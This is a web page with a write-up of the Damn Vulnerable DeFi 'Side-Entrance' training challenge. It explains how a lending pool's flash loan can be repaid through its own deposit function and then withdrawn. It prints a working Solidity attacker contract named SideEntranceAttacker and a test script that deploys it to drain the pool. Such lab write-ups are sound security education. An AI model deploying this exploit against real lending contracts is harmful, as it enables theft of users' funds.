
<!DOCTYPE html>

<html class="no-js" lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width,initial-scale=1" name="viewport"/>
<link href="../Selfie/" rel="prev"/>
<link href="../The-Rewarder/" rel="next"/>
<link href="../../assets/images/favicon.png" rel="icon"/>
<meta content="mkdocs-1.4.2, mkdocs-material-9.1.6" name="generator"/>
<title>Side-Entrance - Smart Contract Security Journey</title>
<link href="../../assets/stylesheets/main.ded33207.min.css" rel="stylesheet"/>
<link href="../../assets/stylesheets/palette.a0c5b2b5.min.css" rel="stylesheet"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
<script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
</head>
<body data-md-color-accent="indigo" data-md-color-primary="pink" data-md-color-scheme="default" dir="ltr">
<script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
<label class="md-overlay" for="__drawer"></label>
<div data-md-component="skip">
<a class="md-skip" href="#side-entrance">
          Skip to content
        </a>
</div>
<div data-md-component="announce">
</div>
<header class="md-header md-header--shadow" data-md-component="header">
<nav aria-label="Header" class="md-header__inner md-grid">
<a aria-label="Smart Contract Security Journey" class="md-header__button md-logo" data-md-component="logo" href="../.." title="Smart Contract Security Journey">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
</a>
<label class="md-header__button md-icon" for="__drawer">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg>
</label>
<div class="md-header__title" data-md-component="header-title">
<div class="md-header__ellipsis">
<div class="md-header__topic">
<span class="md-ellipsis">
            Smart Contract Security Journey
          </span>
</div>
<div class="md-header__topic" data-md-component="header-topic">
<span class="md-ellipsis">
            
              Side-Entrance
            
          </span>
</div>
</div>
</div>
<form class="md-header__option" data-md-component="palette">
<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="pink" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
</label>
<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="blue" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="pink" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"></path></svg>
</label>
</form>
<label class="md-header__button md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
</label>
<div class="md-search" data-md-component="search" role="dialog">
<label class="md-search__overlay" for="__search"></label>
<div class="md-search__inner" role="search">
<form class="md-search__form" name="search">
<input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/>
<label class="md-search__icon md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg>
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg>
</label>
<nav aria-label="Search" class="md-search__options">
<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg>
</button>
</nav>
</form>
<div class="md-search__output">
<div class="md-search__scrollwrap" data-md-scrollfix="">
<div class="md-search-result" data-md-component="search-result">
<div class="md-search-result__meta">
            Initializing search
          </div>
<ol class="md-search-result__list" role="presentation"></ol>
</div>
</div>
</div>
</div>
</div>
</nav>
</header>
<div class="md-container" data-md-component="container">
<main class="md-main" data-md-component="main">
<div class="md-main__inner md-grid">
<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Navigation" class="md-nav md-nav--primary" data-md-level="0">
<label class="md-nav__title" for="__drawer">
<a aria-label="Smart Contract Security Journey" class="md-nav__button md-logo" data-md-component="logo" href="../.." title="Smart Contract Security Journey">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"></path></svg>
</a>
    Smart Contract Security Journey
  </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../..">
        About meeeeh
      </a>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
          Damn Vulnerable DeFi
          <span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="true" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_2">
<span class="md-nav__icon md-icon"></span>
          Damn Vulnerable DeFi
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../Naive-Receiver/">
        Naive-Receiver
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Selfie/">
        Selfie
      </a>
</li>
<li class="md-nav__item md-nav__item--active">
<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
<label class="md-nav__link md-nav__link--active" for="__toc">
          Side-Entrance
          <span class="md-nav__icon md-icon"></span>
</label>
<a class="md-nav__link md-nav__link--active" href="./">
        Side-Entrance
      </a>
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#introduction">
    Introduction
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#code-breakdown">
    Code Breakdown
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#hints">
    Hints
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#solutions">
    Solutions
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#recommendations">
    Recommendations
  </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../The-Rewarder/">
        The-Rewarder
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Truster/">
        Truster
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../Unstoppable/">
        Unstoppable
      </a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          Numen CTF 2023
          <span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_3">
<span class="md-nav__icon md-icon"></span>
          Numen CTF 2023
        </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../Numen%20CTF%202023/Counter/">
        Counter
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../Numen%20CTF%202023/Exist/">
        Exist
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../Numen%20CTF%202023/Lenderpool/">
        Lenderpool
      </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../Numen%20CTF%202023/Wallet/">
        Wallet
      </a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#introduction">
    Introduction
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#code-breakdown">
    Code Breakdown
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#hints">
    Hints
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#solutions">
    Solutions
  </a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#recommendations">
    Recommendations
  </a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-content" data-md-component="content">
<article class="md-content__inner md-typeset">
<h1 id="side-entrance">Side-Entrance<a class="headerlink" href="#side-entrance" title="Permanent link">¶</a></h1>
<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">¶</a></h2>
<p>The goal of this box is to siphon 1000ETHs in an existing lending pool.</p>
<h2 id="code-breakdown">Code Breakdown<a class="headerlink" href="#code-breakdown" title="Permanent link">¶</a></h2>
<p>Similiar to Truster box, it only has 1 smart contract <strong><em>SideEntranceLenderPool.sol</em></strong>.
Let's start by looking at the variables.</p>
<pre><code>using Address for address payable;
mapping (address =&gt; uint256) private balances;
</code></pre>
<p>The address variable uses openzeppelin library to offer more functions.
Reference: <a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#Address">https://docs.openzeppelin.com/contracts/3.x/api/utils#Address</a></p>
<p>Whereas, a simple hashmap is made for <strong><em>balances</em></strong> where each address contains <em>x</em> amount of tokens in integer format.
Reference: <a href="https://medium.com/upstate-interactive/mappings-in-solidity-explained-in-under-two-minutes-ecba88aff96e">https://medium.com/upstate-interactive/mappings-in-solidity-explained-in-under-two-minutes-ecba88aff96e</a></p>
<p>The first function is an interface. It is empty and it contains an <strong><em>execute()</em></strong> function.</p>
<pre><code>interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
</code></pre>
<p>The next function is <strong><em>desposit</em></strong>.
It is simple where it stores the value directly into the hashmap.</p>
<pre><code>function deposit() external payable {
    balances[msg.sender] += msg.value;
}
</code></pre>
<p>Next, a <strong><em>withdraw()</em></strong> function is created for users to withdraw their tokens out to their wallet. Even though it does not have any reentrancy guard, it follows the best practice outlined by Solidity documentation - <a href="https://docs.soliditylang.org/en/v0.8.16/security-considerations.html#use-the-checks-effects-interactions-pattern">Checks-Effect-Interactions Pattern</a>.</p>
<pre><code>function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
</code></pre>
<p>Lastly, <strong><em>flashLoan(uin256 amount)</em></strong> function is created. 
As usual, it checks if the pool have sufficient ETH for borrowing.</p>
<pre><code>uint256 balanceBefore = address(this).balance;
require(balanceBefore &gt;= amount, "Not enough ETH in balance");
</code></pre>
<p>Next, it executes an interface function .</p>
<pre><code>IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
</code></pre>
<p>Lastly, it checks if the loan is returned to the lending pool.</p>
<pre><code>require(address(this).balance &gt;= balanceBefore, "Flash loan hasn't been paid back");        
</code></pre>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">¶</a></h2>
<p>First and foremost, there are two pool of funds - lending pool and individual balance pool. Both are identified based on their address. Here's the problem, the lending pool and individual balance pool have overlaps. </p>
<p>Consider this scenario:
A lending pool has an address.
Since it's an address, it have an individual lending balance pool too.
Let's assign 10 ETH to the lending pool. Notice that the individual Balance pool is 0.</p>
<table>
<thead>
<tr>
<th>Lending Pool</th>
<th>Lending Individual Balance</th>
<th>Attacker Balance Pool</th>
<th>Attacler Balance</th>
</tr>
</thead>
<tbody>
<tr>
<td>10 ETH</td>
<td>0 ETH</td>
<td>0 ETH</td>
<td>0 ETH</td>
</tr>
</tbody>
</table>
<p>This essentially means <code>address(this).balance != balances(address(this))</code>.
Here's the loophole, if we <strong><em>deposit</em></strong> 10 ETH to the <em>Lending Individual Balance</em>, the <em>Lending Pool</em> will still reflect 10 ETH as the ETH was not transferred away from the <em>Lending Pool</em>. However, the function will add 10 ETH into the hashmap which will increase <em>Lending Individual Balance</em> by 10 ETH. Thus, both <em>Lending Pool</em> and <em>Lending Individual Balance</em> will have 10 ETHs respectively. </p>
<pre><code>function deposit() external payable {
    balances[msg.sender] += msg.value;
}
</code></pre>
<p>Understanding this concept, we can also bypass the final check in the <strong><em>flashLoan</em></strong> function as <strong><em>address(this).balance</em></strong> refers to <em>Lending Pool</em>.</p>
<pre><code>require(address(this).balance &gt;= balanceBefore, "Flash loan hasn't been paid back");        
</code></pre>
<p>The result after flashLoan should look like this.</p>
<table>
<thead>
<tr>
<th>Lending Pool</th>
<th>Lending Individual Balance</th>
<th>Attacker Balance Pool</th>
<th>Attacker Balance</th>
</tr>
</thead>
<tbody>
<tr>
<td>10 ETH</td>
<td>10 ETH</td>
<td>0 ETH</td>
<td>0 ETH</td>
</tr>
</tbody>
</table>
<p>Next, we'll withdraw ETHs with the function <strong><em>withdraw()</em></strong>. The function will remove all ETHs from <em>Lending Individual Balance</em> and transfer ETHs from <em>Lending Pool</em> to <strong><em>msg.sender</em></strong>. <strong><em>msg.sender</em></strong> should be coming from <em>Attacker Balance Pool</em>.
Note: You may be thinking, <strong><em>Address.sol</em></strong> requires 2 parameters for the function <strong><em>sendValue</em></strong> yet I only see 1. This should clarify any doubts. <code>payable(msg.sender).sendValue(amountToWithdraw);</code> is the same as <code>Address.sendValue(payable(msg.sender), amountToWithdraw);</code></p>
<pre><code>function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
</code></pre>
<p>Using that function should result in this.</p>
<table>
<thead>
<tr>
<th>Lending Pool</th>
<th>Lending Individual Balance</th>
<th>Attacker Balance Pool</th>
<th>Attacker Balance</th>
</tr>
</thead>
<tbody>
<tr>
<td>0 ETH</td>
<td>0 ETH</td>
<td>10 ETH</td>
<td>0 ETH</td>
</tr>
</tbody>
</table>
<p>Now, we'll shift the 10 ETHs from <em>Attacker Balance Pool</em> to <em>Attacker Balance</em> with a simple transaction which will yield the final result.</p>
<table>
<thead>
<tr>
<th>Lending Pool</th>
<th>Lending Individual Balance</th>
<th>Attacker Balance Pool</th>
<th>Attacker Balance</th>
</tr>
</thead>
<tbody>
<tr>
<td>0 ETH</td>
<td>0 ETH</td>
<td>0 ETH</td>
<td>10 ETH</td>
</tr>
</tbody>
</table>
<h2 id="solutions">Solutions<a class="headerlink" href="#solutions" title="Permanent link">¶</a></h2>
<p>Following the hints above, your smart contract should look similar to this.</p>
<pre><code>// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

/**
 * @title SideEntranceAttacker
 * @author BingleBangle-BH's attacker contract
 */

 contract SideEntranceAttacker{
    using Address for address payable;
    SideEntranceLenderPool public immutable pool;

    constructor (SideEntranceLenderPool _pool){
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() public payable{
        pool.deposit{value: msg.value}();
    }

    function stealFunds() external{
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        address _owner = msg.sender;
        payable(_owner).sendValue(address(this).balance);
    }

    receive () external payable {}
 }
</code></pre>
<p>Here's the javascript</p>
<pre><code class="language-js">it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const SideEntranceAttack = await ethers.getContractFactory('SideEntranceAttacker', attacker);
    this.attackpool = await SideEntranceAttack.deploy(this.pool.address);
    await this.attackpool.stealFunds();
});
</code></pre>
<h2 id="recommendations">Recommendations<a class="headerlink" href="#recommendations" title="Permanent link">¶</a></h2>
<p>Do not use allow two pools of funds to exist in a single smart contract. Use openzeppelin libraries such as<a href="https://docs.openzeppelin.com/contracts/4.x/erc20">ERC20</a> to manage the funds.</p>
</article>
</div>
</div>
</main>
<footer class="md-footer">
<div class="md-footer-meta md-typeset">
<div class="md-footer-meta__inner md-grid">
<div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
      Material for MkDocs
    </a>
</div>
</div>
</div>
</footer>
</div>
<div class="md-dialog" data-md-component="dialog">
<div class="md-dialog__inner md-typeset"></div>
</div>
<script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
<script src="../../assets/javascripts/bundle.51198bba.min.js"></script>
<script src="../../javascripts/mathjax.js"></script>
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</body>
</html>